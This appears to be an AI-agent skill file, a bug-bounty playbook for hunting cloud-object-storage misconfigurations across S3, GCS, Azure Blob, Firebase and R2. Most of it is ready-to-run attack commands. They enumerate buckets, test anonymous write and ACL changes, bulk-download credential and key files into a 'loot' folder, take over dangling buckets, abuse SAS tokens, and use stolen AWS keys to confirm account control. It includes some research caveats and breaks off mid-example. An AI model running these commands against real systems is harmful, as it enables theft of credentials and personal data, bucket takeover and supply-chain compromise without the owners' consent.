---
name: hunt-s3-misconfig
description: "Modern cloud-object-storage misconfiguration hunting (AWS S3, GCS, Azure Blob, Firebase, Cloudflare R2, Backblaze B2, DigitalOcean Spaces). Load when JS bundles or DNS records reveal s3.amazonaws.com, *.blob.core.windows.net, storage.googleapis.com, *.appspot.com, *.firebaseapp.com, *.r2.dev, *.digitaloceanspaces.com, *.b2.backblazeb2.com, or any *amazonaws.com/* path. Load on x-amz-* / x-ms-* / x-goog-* response headers, on NoSuchBucket/AccessDenied/AllAccessDisabled bodies, on CNAME pointing to any cloud-storage frontend, on Firebase config blobs (apiKey+projectId+storageBucket), on cf-templates / aws-glue-assets / cdk-hnb659fds / sagemaker- bucket patterns, on presigned URL parameters in API responses, or on SVG/avatar/document upload flows that store to object storage. Critical-only: anonymous WRITE on a JS/HTML-serving bucket = supply-chain RCE; abandoned-bucket re-registration with active referrers = SolarWinds-scale impact; SSE-C ransomware = full data loss in minutes; Bucket-Monopoly shadow-resource takeover = AWS account RCE. Skip if all paths return 403 with no x-amz-bucket-region leak and the bucket is in a region with Block Public Access account-default and the org enforces SSE-KMS-only."
type: hunt
---

# Hunt: Cloud-Object-Storage Misconfiguration (2025-2026 Edition)

## TL;DR — Decision Tree (read first)

```
target asset →
├─ Found bucket name?                          → STEP 1 (find it)
├─ Bucket exists (403 / 200)?
│  ├─ 200 ListBucket public?                   → STEP 2 + 3A   (read + secret hunt)
│  ├─ 403 + writable?                          → STEP 2 + 3B   (write supply chain)
│  ├─ CNAME → bucket but NoSuchBucket?         → STEP 2 + 3C   (TAKEOVER)
│  ├─ Presigned URL endpoint in app?           → STEP 4        (filePath=/ test)
│  ├─ AWS service bucket name predictable?     → STEP 5        (Bucket Monopoly)
│  ├─ R2 / DigitalOcean / B2 / Azure / GCS?    → STEP 6        (provider-specific)
│  ├─ Firebase Storage / Firestore endpoint?   → STEP 7        (Agneyastra ladder)
└─ Account-ID enumeration desired?             → STEP 8        (ResourceAccount walk)
```

Critical findings only. If a finding does not chain to read-of-sensitive-data, write-of-served-content, account-takeover, or supply-chain RCE — skip and move on.

---

## CROWN-JEWEL IMPACT — Why this skill earns max bounty

| Pattern | Impact | Severity | 2024-26 reference |
|---|---|---|---|
| Public WRITE on JS/CSS bucket | Supply chain → mass XSS → ATO of every user | CRITICAL | watchTowr Feb 2025 — 8M requests on 150 abandoned buckets |
| Abandoned bucket re-registration | Hostile dependency for every requester (binaries, CFN, VPN configs, JS) | CRITICAL | Same — would've dwarfed SolarWinds |
| SSE-C ransomware on stolen keys | Permanent data loss; AWS only logs HMAC of attacker key | CRITICAL | Codefinger Jan 2025 |
| Bucket Monopoly (shadow resources) | Pre-register predictable bucket → AWS service trusts it → RCE / CFN admin-role inject | CRITICAL | Aqua, Black Hat USA 2024 |
| Public READ + Terraform state / .env / id_rsa | Cloud creds → full account compromise | CRITICAL | Sysdig 8-minute case Nov 2025 |
| Firebase Storage open + insecure rules | KYC photos + private chats leaked at scale | CRITICAL | Tea-app Jul 2025 (1.1M messages, 72k images) |
| Dangling CNAME → S3 takeover | Cookie scoping `.parent.com` → ATO, CSRF bypass | HIGH→CRITICAL | Ongoing |
| Presigned URL `filePath=/` | Bucket root listing | HIGH | $20k H1 finding |
| Trusted-Advisor evasion via Deny-policy | Bucket public-but-green | HIGH (post-fix Jun 2025) | Fog Security May 2025 |
| Public LIST without sensitive content | Attack-surface map only | LOW — skip |

---

## STEP 1 — FIND THE BUCKET

### 1A · JS-bundle mining (highest ROI)
```bash
# Extract from main page
curl -s "https://$TARGET" | grep -oE 'https?://[a-zA-Z0-9._-]+\.(s3[.-][a-zA-Z0-9.-]*\.amazonaws\.com|blob\.core\.windows\.net|storage\.googleapis\.com|appspot\.com|firebaseio\.com|firebasestorage\.googleapis\.com|r2\.dev|digitaloceanspaces\.com|b2\.backblazeb2\.com)[^"\x27)\s]*' | sort -u

# Recursive crawl through every JS bundle
for js in $(curl -s "https://$TARGET" | grep -oE 'src="[^"]+\.js"' | cut -d'"' -f2); do
  url=$([[ "$js" == http* ]] && echo "$js" || echo "https://$TARGET${js#/}")
  curl -sL "$url" | grep -oE '[a-zA-Z0-9._-]+\.(s3[.-][a-zA-Z0-9.-]*\.amazonaws\.com|blob\.core\.windows\.net|storage\.googleapis\.com|appspot\.com|firebaseio\.com|firebasestorage\.googleapis\.com|r2\.dev)[^"\x27)\s]*'
done | sort -u

# Bucket-name regex in source maps & bundles
grep -oE '"(bucket|bucketName|s3Bucket|storageBucket|gcsBucket)"\s*:\s*"[^"]+"' bundle.js
grep -oE '[a-zA-Z0-9._-]+-(assets|static|uploads|media|backup|backups|prod|stage|dev|cdn|public|private|images|files|logs|data)' bundle.js | sort -u
```

### 1B · DNS / CNAME discovery
```bash
# AWS S3
subfinder -d $TARGET -silent | while read s; do
  cname=$(dig +short CNAME $s)
  echo "$cname" | grep -qE 's3[.-].*amazonaws\.com|s3-website' && echo "S3: $s -> $cname"
done

# GCS / Firebase
subfinder -d $TARGET -silent | while read s; do
  cname=$(dig +short CNAME $s)
  echo "$cname" | grep -qE 'c\.storage\.googleapis\.com|appspot\.com|firebaseapp\.com|firebaseio\.com' && echo "GCP/Firebase: $s -> $cname"
done

# Azure Blob
subfinder -d $TARGET -silent | while read s; do
  cname=$(dig +short CNAME $s)
  echo "$cname" | grep -qE 'blob\.core\.windows\.net|azureedge\.net|azurewebsites\.net' && echo "Azure: $s -> $cname"
done

# httpx server-header fingerprint
subfinder -d $TARGET -silent | httpx -silent -server -threads 50 | grep -iE 'AmazonS3|Windows-Azure-Blob|UploadServer'
```

### 1C · HTTP-response leakage (works even on 403)
```bash
# Region disclosure on any bucket name — works even if AccessDenied
curl -sI "https://$BUCKET.s3.amazonaws.com/" | grep -i 'x-amz-bucket-region'
# Azure equivalent
curl -sI "https://$ACCOUNT.blob.core.windows.net/$CONTAINER/" | grep -i 'x-ms-'
# GCS
curl -sI "https://storage.googleapis.com/$BUCKET/" | grep -iE 'x-goog-|x-guploader-uploadid'
```

### 1D · Search-engine dorking
```text
# Google
site:s3.amazonaws.com "$TARGET"
site:blob.core.windows.net "$TARGET"
site:storage.googleapis.com "$TARGET"
site:firebaseio.com "$TARGET"
site:r2.dev "$TARGET"
inurl:s3.amazonaws.com filetype:env OR filetype:sql OR filetype:tfstate "$TARGET"

# Shodan
x-amz-err-code:NoSuchBucket          ← takeover gold
http.title:"403 Forbidden" http.server:"AmazonS3" "$TARGET"
ssl.cert.subject.CN:"*.blob.core.windows.net" port:443
ssl:"r2.dev" 200

# GitHub code search
"$TARGET" "s3.amazonaws.com" in:code
"$TARGET-bucket" "s3://" in:code
"firebaseConfig" "$TARGET" in:code
"AKIA" "$TARGET" in:code
"x-amz-acl" "$TARGET" in:code

# Wayback Machine — abandoned-bucket discovery (watchTowr method)
curl "http://web.archive.org/cdx/search/cdx?url=*.s3.amazonaws.com&output=text&fl=original&collapse=urlkey&limit=500&matchType=domain&filter=statuscode:200" | grep -i "$TARGET" | sort -u
```

### 1E · Pattern enumeration
```bash
TARGET="companyname"
REGIONS=(us-east-1 us-east-2 us-west-1 us-west-2 eu-west-1 eu-central-1 ap-southeast-1 ap-southeast-2 ap-northeast-1 ap-south-1)
SUFFIXES=(
  "" -assets -static -uploads -media -images -files -backup -backups -dump -dumps -data -logs
  -prod -production -stage -staging -dev -test -qa -uat -public -private -cdn -content
  -terraform -tfstate -infra -infrastructure -build -artifacts -releases -archive
  -kyc -id-photos -documents -invoices -reports -exports -reports-prod
)
PREFIXES=("" "assets-" "static-" "media-" "cdn-" "api-" "internal-" "private-")

for p in "${PREFIXES[@]}"; do for s in "${SUFFIXES[@]}"; do
  b="${p}${TARGET}${s}"
  code=$(curl -sI -o /dev/null -w '%{http_code}' "https://$b.s3.amazonaws.com/")
  region=$(curl -sI "https://$b.s3.amazonaws.com/" | grep -i 'x-amz-bucket-region' | tr -d '\r' | awk '{print $2}')
  [[ "$code" =~ ^(200|301|403)$ ]] && echo "$code  region=$region  $b"
done; done
```

### 1F · Shadow-resource (Bucket Monopoly) patterns
Predictable buckets created by AWS services. Look for these in scope's known AWS account ID. (Most patched 2024 but always probe fresh services.)
```bash
ACCT="123456789012"   # if you discovered it
REGIONS=(us-east-1 us-east-2 us-west-1 us-west-2 eu-west-1 eu-central-1 eu-west-2 ap-southeast-1 ap-southeast-2)
PATTERNS=(
  "cf-templates-HASH-${ACCT}-REGION"      # CloudFormation (HASH = 12-char random)
  "aws-glue-assets-${ACCT}-REGION"        # Glue
  "aws-emr-studio-${ACCT}-REGION"         # EMR Studio
  "aws-emr-resources-${ACCT}-REGION"      # EMR
  "sagemaker-REGION-${ACCT}"              # SageMaker
  "service-catalog-REGION-${ACCT}"        # Service Catalog
  "codestar-REGION-${ACCT}"               # CodeStar
  "cdk-hnb659fds-assets-${ACCT}-REGION"   # CDK bootstrap (fixed v2.149+)
  "cdk-hnb659fds-container-assets-${ACCT}-REGION"
)
for region in "${REGIONS[@]}"; do for p in "${PATTERNS[@]}"; do
  b=$(echo "$p" | sed "s/REGION/$region/")
  curl -sI -o /dev/null -w '%{http_code}  %s\n' -w "https://$b.s3.amazonaws.com/" "$b"
done; done
```

### 1G · Tools
```bash
# Multi-cloud enum (S3 + Azure + GCS)
python3 cloud_enum.py -k "$TARGET" --disable-azure-files

# S3 fast permission scanner
go install github.com/sa7mon/S3Scanner@latest
s3scanner scan -bucket-file buckets.txt

# DNS-based stealth S3 enum (no CloudTrail hit on victim)
go install github.com/koenrh/s3enum@latest
s3enum -domain $TARGET -wordlist words.txt

# Azure Blob
go install github.com/Macmod/goblob@latest
goblob -account "$TARGETacct"

# Azure Files / Storage Account
pwsh -c "Import-Module ./MicroBurst.psm1; Invoke-EnumerateAzureBlobs -Base $TARGET"

# GrayHatWarfare (Premium ROI: regex + full-path)
# https://buckets.grayhatwarfare.com/files?keywords=.env&domain=$TARGET

# Nuclei templates
nuclei -l subdomains.txt -t http/takeovers/ -t cloud/aws/s3/ -t cloud/azure/
```

---

## STEP 2 — TEST PERMISSIONS (provider-agnostic primer)

### S3 permission ladder
```bash
B="target-bucket"; T="probe_$(date +%s).txt"

# 1. List
aws s3 ls "s3://$B/" --no-sign-request 2>&1 | head

# 2. Read (pick a known object key from list)
aws s3api get-object --bucket "$B" --key "INDEX.html" --no-sign-request /tmp/r 2>&1

# 3. Write (text-only PoC)
echo "security-probe $(date)" > /tmp/$T
aws s3 cp /tmp/$T "s3://$B/$T" --no-sign-request 2>&1

# 4. Write-ACL (privilege escalation: take ownership)
aws s3api put-object-acl --bucket "$B" --key "$T" --acl public-read --no-sign-request 2>&1

# 5. Authenticated-AWS-user (= ANY AWS account) — *MUST* test with creds, not --no-sign-request
aws s3 ls "s3://$B/" --profile attacker
aws s3 cp /tmp/$T "s3://$B/auth_$T" --profile attacker

# 6. Bucket-level ACL
aws s3api get-bucket-acl --bucket "$B" --no-sign-request 2>&1
aws s3api put-bucket-acl --bucket "$B" --acl public-read-write --no-sign-request 2>&1

# 7. Bucket policy
aws s3api get-bucket-policy --bucket "$B" --no-sign-request 2>&1

# 8. Static-website + CORS
aws s3api get-bucket-website --bucket "$B" --no-sign-request 2>&1
aws s3api get-bucket-cors --bucket "$B" --no-sign-request 2>&1
```

### Quick HTTP-method probe (no AWS CLI needed)
```bash
B="target-bucket"
for m in GET HEAD PUT DELETE OPTIONS POST; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $m "https://$B.s3.amazonaws.com/")
  echo "$m → $code"
done
curl -X PUT "https://$B.s3.amazonaws.com/probe.txt" --data "probe $(date)" -w "\n%{http_code}\n"
```

### The `AuthenticatedUsers` trap
`AuthenticatedUsers` = **any AWS account holder on the planet**, not "people in this org". A bucket ACL granting this group write permission is the same as anonymous write for any attacker who can `aws configure`. *Always re-test with `--profile` after testing with `--no-sign-request`.*

---

## STEP 3 — EXPLOIT (proof of impact)

### 3A · Public READ — sensitive data extraction
```bash
B="target-bucket"
D="./loot_$(date +%s)"; mkdir -p $D

# Sync only — limit to 1 GB to avoid recon trip-wires
aws s3 sync s3://$B/ $D/ --no-sign-request --size-only --exclude "*" \
  --include "*.env" --include "*.json" --include "*.yaml" --include "*.yml" \
  --include "*.sql" --include "*.dump" --include "*.bak" --include "*.backup" \
  --include "*.key" --include "*.pem" --include "*.crt" --include "*.p12" --include "*.pfx" \
  --include "*.tfstate" --include "*.tfvars" --include "*.config" --include "*.conf" \
  --include "wp-config*" --include "config.*" --include "credentials*" --include "secrets*" \
  --include "id_rsa*" --include "id_dsa*" --include "id_ecdsa*" --include "*.ppk" \
  --include ".htpasswd" --include ".htaccess" --include "database.yml" \
  --include "*.csv" --include "*.parquet" --include "*.xlsx"

# Verified secret scan
trufflehog s3 --bucket=$B --only-verified
gitleaks detect --source $D --no-git -f json -r ${D}-gitleaks.json

# Hand-roll AWS key hunt
grep -rE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|aws_secret_access_key' $D
grep -rE 'GOOG[0-9A-Z]+|gcs_credentials|AIza[0-9A-Za-z\\-_]{35}' $D     # GCP
grep -rE 'AccountKey=|sharedaccesskey=|SharedAccessSignature=' $D       # Azure
grep -rE 'mongodb(\+srv)?://[^"\x27\s]+|postgres://[^"\x27\s]+|mysql://[^"\x27\s]+' $D
```

### 3B · Public WRITE — supply-chain (CRITICAL, handle with discipline)
```bash
B="target-assets-bucket"

# NEVER upload executable JS/HTML/SVG to a victim bucket — even for a "PoC".
# Use a benign text marker only. Document the JS files you *could* have replaced.

cat > /tmp/SECURITY-PROBE.txt << EOF
This object was uploaded by a coordinated security researcher to confirm that
$B accepts anonymous writes. Contents are non-malicious. The bucket also
serves the following JS/CSS files which would be valid targets for a real attacker:
$(aws s3 ls s3://$B/ --recursive --no-sign-request | grep -E '\.(js|css|html|json)$' | head -20)

Researcher: <your H1 handle>
Timestamp:  $(date -u +%FT%TZ)
EOF

aws s3 cp /tmp/SECURITY-PROBE.txt s3://$B/SECURITY-PROBE-$(date +%s).txt --no-sign-request

# Confirm
curl -s "https://$B.s3.amazonaws.com/SECURITY-PROBE-*.txt"

# Document JS files that COULD be hijacked (do not modify them)
aws s3 ls s3://$B/ --recursive --no-sign-request | grep -E '\.js$' > findings/$B-js-targets.txt
```

### 3C · Bucket takeover (dangling CNAME)
```bash
SUB="files.target.com"

# 1. Confirm dangling
dig +short CNAME $SUB
# → target-old-assets.s3-website-us-east-1.amazonaws.com    (note region!)

curl -sI "https://target-old-assets.s3.amazonaws.com/" | head
curl -s "https://target-old-assets.s3.amazonaws.com/" | grep -i NoSuchBucket
# → <Code>NoSuchBucket</Code> ✓ vulnerable

# 2. Re-register SAME NAME SAME REGION (CRITICAL — wrong region = no takeover)
REGION="us-east-1"
aws s3 mb s3://target-old-assets --region $REGION

# 3. Configure static website (matches victim CNAME format)
aws s3 website s3://target-old-assets/ --index-document index.html

# 4. Public-read policy
cat > /tmp/pol.json <<'EOF'
{ "Version":"2012-10-17","Statement":[{ "Sid":"PoC","Effect":"Allow","Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::target-old-assets/*"}]}
EOF
aws s3api put-bucket-policy --bucket target-old-assets --policy file:///tmp/pol.json

# 5. Upload non-malicious takeover proof
cat > /tmp/index.html <<EOF
<!doctype html><meta charset=utf-8><title>Takeover PoC</title>
<h1>Subdomain takeover proof</h1>
<p>$SUB points to an unclaimed S3 bucket. This page is served from a
   researcher-controlled bucket of the same name. Token: $(uuidgen)</p>
<p>Researcher: <your handle>. Bucket region: $REGION. Time: $(date -u +%FT%TZ).</p>
EOF
aws s3 cp /tmp/index.html s3://target-old-assets/index.html --content-type "text/html"

# 6. Confirm takeover from victim CNAME
curl -s "http://$SUB/"          # site:// endpoint
curl -s "https://$SUB/"

# 7. Document then CLEAN UP after report acknowledged
# aws s3 rb s3://target-old-assets --force
```

### 3D · Abandoned-bucket re-registration (watchTowr method)
Same mechanic as 3C but the trigger isn't a CNAME — it's clients hard-coded to fetch from the bucket name (binaries, package managers, CI scripts). Process:
1. Enumerate bucket names referenced in *historical* JS/code (Wayback, GitHub history, package registries, OS-update mechanisms, CloudFormation templates that reference S3 by name).
2. For each, `HEAD` against `<bucket>.s3.amazonaws.com`. Look for `404 NoSuchBucket`.
3. If unclaimed → register in same region. Enable access-log only. Let traffic land. Count.
4. Report aggregated request volume + sample request paths as the PoC. Do **not** serve content back (would be malicious). Sinkholing is the deliverable.

### 3E · SSE-C ransomware demonstration (do NOT do this without explicit authorisation)
The Codefinger pattern is so easily reproduced that bug-bounty reports usually only need to demonstrate the *capability*: that a stolen key has `s3:PutObject` and the bucket policy does not deny SSE-C. Demonstrate by checking IAM policy + bucket policy, not by actually re-encrypting.
```bash
# Read-only capability check (SAFE)
aws s3api get-bucket-policy --bucket $B --profile stolen 2>&1 | jq '.Policy' -r | jq '.Statement[] | select(.Condition.StringNotEquals."s3:x-amz-server-side-encryption-customer-algorithm")'
# If no Deny on SSE-C headers AND the key has s3:PutObject → ransomware-viable
```

---

## STEP 4 — PRESIGNED URL ATTACKS (high bounty)

### 4A · `filePath=/` → entire bucket listing
Pattern: API endpoint generates a presigned URL from a user-controlled path parameter.
```bash
# Baseline — request your own file
curl "https://api.target.com/v1/download?filePath=user-123/avatar.png"
# → returns: https://bucket.s3.amazonaws.com/user-123/avatar.png?...&X-Amz-Signature=...

# Probe 1: empty / root
curl "https://api.target.com/v1/download?filePath=/"
curl "https://api.target.com/v1/download?filePath="

# Probe 2: cross-user traversal
curl "https://api.target.com/v1/download?filePath=../user-999/private.pdf"
curl "https://api.target.com/v1/download?filePath=user-999%2Fprivate.pdf"

# Probe 3: bucket-scoped action escalation
curl "https://api.target.com/v1/download?filePath=*"
curl "https://api.target.com/v1/download?filePath=?list-type=2"
```
Each successful response is a signed URL granting access to data the requester should not see. Follow the signed URL and capture the body — *that* is the PoC.

### 4B · Signed URL with `?response-content-disposition=` poisoning
Some implementations let the user control response headers via signed-URL overrides. Try injecting `&response-content-type=text/html` on an SVG to bypass forced-download.

### 4C · POST policy bypass (Detectify pattern)
For `s3:PostObject` with a signed policy, look for:
- `acl` field user-controllable → set to `public-read` for permanent public-read of victim uploads.
- `content-type` starts-with `""` → allow upload of anything including HTML/SVG/JS.
- `key` starts-with `"$"` → allow upload anywhere in the bucket (overwrite static-site files).
- `success_action_redirect` reflective → open redirect.

### 4D · OpenStack Keystone CVE-2025-65073 (private-cloud)
If the target uses OpenStack with EC2-compatible auth: replay any valid S3 presigned URL to `/v3/ec2tokens` or `/v3/s3tokens`. Server may accept and return a fully-scoped Keystone token. Patched upstream; un-patched private clouds are exposed.

---

## STEP 5 — BUCKET MONOPOLY / SHADOW-RESOURCE PRE-CLAIM

Most AWS-managed buckets with predictable names were patched 2024-mid-2025, but the *pattern* is alive — any new AWS service that auto-generates a bucket from `<accountID>` + `<region>` is the next finding. Test workflow:
1. Identify a service the target uses *or might use* (Athena, AppFlow, Resilience Hub, fresh data services).
2. Build the bucket-name template from AWS public docs.
3. Probe the regions the target has *not* expanded into.
4. If unclaimed in all regions → register one as "honeypot mode" (logging-only). Wait. If the target eventually enables the service in that region, you'll see traffic + AWS will write data to your bucket.
5. Report on capability — do **not** actually serve back data.

Reproducible from the Aqua research base: `cf-templates-{rand}-{acct}-{region}`, `aws-glue-assets-{acct}-{region}`, `sagemaker-{region}-{acct}`, `cdk-hnb659fds-assets-{acct}-{region}`. Each has been patched but the same generator may recur.

---

## STEP 6 — PROVIDER-SPECIFIC PLAYS

### 6A · Google Cloud Storage
```bash
# Permission test
gsutil ls gs://$BUCKET                                  # list
curl -s "https://storage.googleapis.com/$BUCKET/"       # XML listing if allUsers READ
gsutil iam get gs://$BUCKET                             # IAM bindings (read perms)
gsutil iam ch allUsers:objectViewer gs://$BUCKET        # WRITE-elevation if you have it

# Dangerous bindings to look for
#   allUsers:roles/storage.objectViewer       → public read
#   allUsers:roles/storage.objectAdmin        → public write
#   allAuthenticatedUsers:*                   → any Google account = public

# Dangling-bucket takeover (silent)
# GCS bucket names are *global*. Deleted bucket → anyone in GCP can claim it.
gsutil mb -p $YOUR_PROJECT -l US gs://$DELETED_BUCKET_NAME
# then mirror Firebase setup if takeover targets *.firebasestorage.app

# Endpoint disclosure pivot
# Authenticated browser downloads redirect through:
#   https://<rand>-apidata.googleusercontent.com/download/storage/v1/b/<BUCKET>/o/<OBJECT>
# Capture in referer/proxy logs → bucket name leaks even on private buckets.
```

### 6B · Azure Blob
```bash
ACCT="targetaccount"
# Container access
curl -s "https://$ACCT.blob.core.windows.net/?comp=list"           # 'Account' public
curl -s "https://$ACCT.blob.core.windows.net/$CONTAINER/?restype=container&comp=list"  # 'Container'

# Storage account enum (DNS-based)
for w in $(cat azure-words.txt); do
  host "${TARGET}${w}.blob.core.windows.net" 2>/dev/null | grep -q "has address" && \
    echo "Found: ${TARGET}${w}"
done

# SAS-token capture & abuse
# Look in JS bundles / mobile apps for: ?sv=YYYY-MM-DD&ss=b&srt=co&sp=rwdlc&sig=...
# Replay across containers. Common misconfigs:
#   - sp=rwdlacypui  (way too broad)
#   - se=2099-...    (10-year expiry)
#   - sip=           (no IP restriction)
#   - srt=sco        (service+container+object — full account)

# Goblob — fastest enumeration
goblob -account "$ACCT" -containers wordlists/azure-containers.txt
```
Microsoft's Oct 2025 advisory: attackers actively scan `*.blob.core.windows.net` for `Container` ACL, abuse long-lived SAS tokens, and pivot via Cloud Shell persistence. Treat SAS tokens with `se >` 12 months as a finding regardless of further chain.

### 6C · Cloudflare R2
```bash
# r2.dev public-access detection
# Pattern: pub-<32hex>.r2.dev — leftover dev-mode URL
curl -sI "https://pub-${HASH}.r2.dev/"

# R2 doesn't have ACLs or bucket policies — only:
#   - Custom-domain CORS misconfig (`Access-Control-Allow-Origin: *` with creds)
#   - Left-on r2.dev dev URL (developer forgets to disable)
#   - API-token leakage in CI / mobile / GitHub
# Wrangler CLI for ops:
wrangler r2 bucket list                       # if you have the API token
wrangler r2 dev-url disable <bucket>          # how victims fix
```
Subdomain takeover requires control of a Cloudflare account that can re-attach the same custom domain — much harder than S3 takeover. Most R2 bounties are CORS or r2.dev leftovers.

### 6D · Backblaze B2 / DigitalOcean Spaces / Linode Object Storage
- B2 buckets are global-namespace; takeover requires valid B2 keys. Hunt hardcoded `b2_application_key` in mobile/desktop binaries.
- DigitalOcean Spaces: API vs Console divergence is documented — public ACL settable via API may not show in console. If the org has Spaces, test both paths.
- Linode Object Storage: S3-compatible; same tooling (`aws --endpoint-url=https://us-east-1.linodeobjects.com`).

### 6E · Firebase Storage / Firestore / RTDB
See STEP 7 (dedicated).

---

## STEP 7 — FIREBASE (Storage + Firestore + RTDB + Remote Config)

### 7A · Reconnaissance
```bash
# Pull Firebase config blob from JS
curl -s https://target.com | grep -oE 'apiKey:\s*"[^"]+"|projectId:\s*"[^"]+"|storageBucket:\s*"[^"]+"|databaseURL:\s*"[^"]+"|appId:\s*"[^"]+"'

# From APK (mobile)
apktool d target.apk -o out/
grep -rE '(apiKey|projectId|storageBucket|databaseURL)' out/res/values/strings.xml

# Storage bucket
curl -s "https://firebasestorage.googleapis.com/v0/b/PROJECT.appspot.com/o?maxResults=10"
# Anonymous read works → bucket is public-listable
```

### 7B · Agneyastra (RedHunt Labs) — single-shot test ladder
```bash
go install github.com/redhuntlabs/agneyastra/cmd/agneyastra@latest

agneyastra --api-key AIzaSyD... --project-id target-prod
# It runs:
#   1. Unauth → list users / read storage / read RTDB / read Firestore / read Remote Config
#   2. Anonymous Auth → can we satisfy `request.auth != null` rule trivially?
#   3. Email-signup → can a new user read /users/{otherUserId}/*  ?
# Plus correlation engine to confirm the Firebase project belongs to the target.
```

### 7C · Manual Firestore rule check
```bash
# REST query — empty array on permitted-but-empty, 403 on rules-blocked
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/users"
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/admin"
```
Common dev-time-leftover rule: `match /{document=**} { allow read, write: if true; }` → full DB readable + writable anonymously.

### 7D · Tea-app-style chain
1. Find legacy `*.appspot.com` storage bucket referenced in old APK or web.archive.org snapshot.
2. Storage rules `allow read: if true;` → anyone with object names can fetch.
3. Object names are predictable (`uploads/{uid}.jpg` or sequential).
4. Recursive listing via REST `?maxResults=1000` → millions of objects → PII archive.

### 7E · Firebase RTDB (legacy)
```bash
# JSON-leaf dump:
curl -s "https://$PROJECT.firebaseio.com/.json?print=pretty"        # full DB if open
curl -s "https://$PROJECT.firebaseio.com/users.json"                # collection
# REST takes auth=<idToken> — try without (anon) then with self-issued anon token
```

---

## STEP 8 — ACCOUNT-ID ENUMERATION (Tracebit / Cloudar)

`s3:ResourceAccount` policy condition + wildcard matching = walk the victim's 12-digit AWS account ID one digit at a time → 120 attempts max.

### 8A · `s3-account-search` (public-bucket variant)
```bash
pip install s3-account-search

# Prereqs:
#   - Your own AWS account with a role you can assume that has s3:GetObject on the target.
#   - Target bucket must be public-read OR you have any cross-account access to one object.
ROLE_ARN="arn:aws:iam::YOUR_ACCT:role/probe"
s3-account-search $ROLE_ARN s3://target-public-bucket/known-key.txt
# Output: "Discovered account: 1234XXXXXXXX"
```

### 8B · `find-s3-account` (Tracebit private-bucket variant)
Uses VPC-endpoint policy + CloudTrail timing differential. Works on private buckets if you have *any* access path through your VPC.

### 8C · Use the account ID
```bash
# 1. EBS public-snapshot search (huge credential gold mine)
aws ec2 describe-snapshots --owner-ids $ACCT --region $R

# 2. AMI public-image search
aws ec2 describe-images --owners $ACCT --region $R

# 3. RDS public snapshot search
aws rds describe-db-snapshots --include-public --snapshot-type public

# 4. Validate leaked AKIA/ASIA keys belong to this account (cross-check)
aws sts get-caller-identity --profile leaked
# → Account: 1234XXXXXXXX
```

---

## RESPONSE-CODE REFERENCE

| Code / Body | Meaning | Action |
|---|---|---|
| `200` | Bucket exists, can list | Enumerate, then permission ladder |
| `200 + AccessDenied body` (Azure container) | Anonymous list denied; account exists | Brute-force container name |
| `301 + x-amz-bucket-region` | Wrong region; follow header | Use correct region for tooling |
| `403 + x-amz-bucket-region` | Bucket exists, no list, region leaked | Direct object guess; `ResourceAccount` enum |
| `403 + AllAccessDisabled` | Account-level Block Public Access | Move on |
| `403 + AccessDenied` | Bucket-policy explicit deny | Try cross-account creds, presigned-URL endpoints |
| `404 + NoSuchBucket` | **TAKEOVER candidate** | Verify CNAME, register same name same region |
| `404` (no body) | Post-2023 AWS suppression on CloudFront origin | Bucket name enumeration required first |
| `NoSuchKey` | Bucket exists, object doesn't | Bucket usable; pivot to listing |
| `MethodNotAllowed` | Object/bucket-level confusion | Recheck virtual-hosted vs path-style |

---

## SEVERITY DECISION

### Critical (report immediately, never wait for batch)
- Anonymous WRITE on bucket serving JS/HTML/CSS for production target → supply chain → mass ATO.
- Public READ of `terraform.tfstate`, `.env`, `id_rsa`, `wp-config*`, AWS/GCP/Azure credential files.
- Abandoned bucket re-registered with active 100+/day reference traffic to executable content.
- Bucket Monopoly viable: predictable AWS-service bucket pre-claimable in target's likely-future region.
- S3 takeover on main login domain, auth subdomain, or `.parent.com`-cookie-scoped subdomain.
- SSE-C ransomware feasibility on a bucket with no `Deny` and stolen keys with `s3:PutObject`.
- Firebase Storage open + bucket contains identity documents / private messages / payment data.

### High
- Anonymous WRITE on any bucket (data integrity / defacement).
- Mass PII readable (customer DBs, support attachments at 10k+ scale).
- Long-lived (>1y) Azure SAS token with broad permissions (sp=rwdlac).
- Presigned URL `filePath=` traversal across users.
- Static-website takeover on cookie-scoped subdomain.
- Trusted-Advisor evasion variant on bucket that hides public-state.

### Medium
- Public LIST without sensitive content (recon value only).
- CORS `Access-Control-Allow-Origin: *` + `Allow-Credentials: true` (cred theft potential).
- Account-ID disclosure via `ResourceAccount` walking (info-disclosure pivot).
- Internal path/structure revealed by directory listing.

### Low / Info — DO NOT submit unsupported
- Bucket exists but private + no region leak.
- Directory listing of public marketing PDFs only.
- Pure naming-enumeration with no read/write.

---

## CHAIN EXAMPLES (the bounty-winning ones)

### Chain 1 — JS bucket WRITE → mass XSS → ATO
```
1. cdn.target.com → CNAME → target-assets.s3-website-us-east-1.amazonaws.com
2. PUT /test.txt → 200 (anonymous write enabled)
3. Bucket serves /app.min.js loaded by target.com on every page
4. (Do NOT exploit live) Document the JS paths and that PutObject works
5. Impact = every user that loads target.com → arbitrary JS execution → cookie theft → ATO
Severity: CRITICAL
```

### Chain 2 — Public tfstate → AWS keys → full account
```
1. Public bucket lists terraform.tfstate
2. cat tfstate | jq '.resources[].instances[].attributes' → AKIA... + secret
3. aws sts get-caller-identity --profile stolen → confirms account
4. aws iam list-attached-user-policies → AdministratorAccess
Severity: CRITICAL
```

### Chain 3 — Abandoned bucket → supply chain
```
1. Old JS bundle on web.archive.org references cdn-legacy-target.s3.amazonaws.com
2. HEAD → 404 NoSuchBucket
3. aws s3 mb s3://cdn-legacy-target --region us-east-1
4. Enable access logging only (sinkhole) — wait 7 days
5. Report on traffic volume + sample request paths (binaries, JS, configs)
Severity: CRITICAL — never serve back content; sinkhole is the deliverable.
```

### Chain 4 — Presigned URL `filePath=/` → bucket-wide read
```
1. POST /api/download {filePath:"/"}
2. Receive signed URL with X-Amz-Signature for s3://bucket/
3. GET signed URL → ListBucketResult XML for every user's files
Severity: HIGH ($20k tier H1)
```

### Chain 5 — Firebase Storage + insecure rules → mass PII
```
1. JS leak: storageBucket: "target-prod.appspot.com"
2. curl .../o?maxResults=1000 → enumerable
3. GET each object → KYC photos, ID documents, private chats
Severity: CRITICAL — Tea-app pattern
```

### Chain 6 — Bucket Monopoly → CDK bootstrap → admin role inject
```
1. Target uses CDK with default bootstrap. Find their AWS account ID (Chain 7).
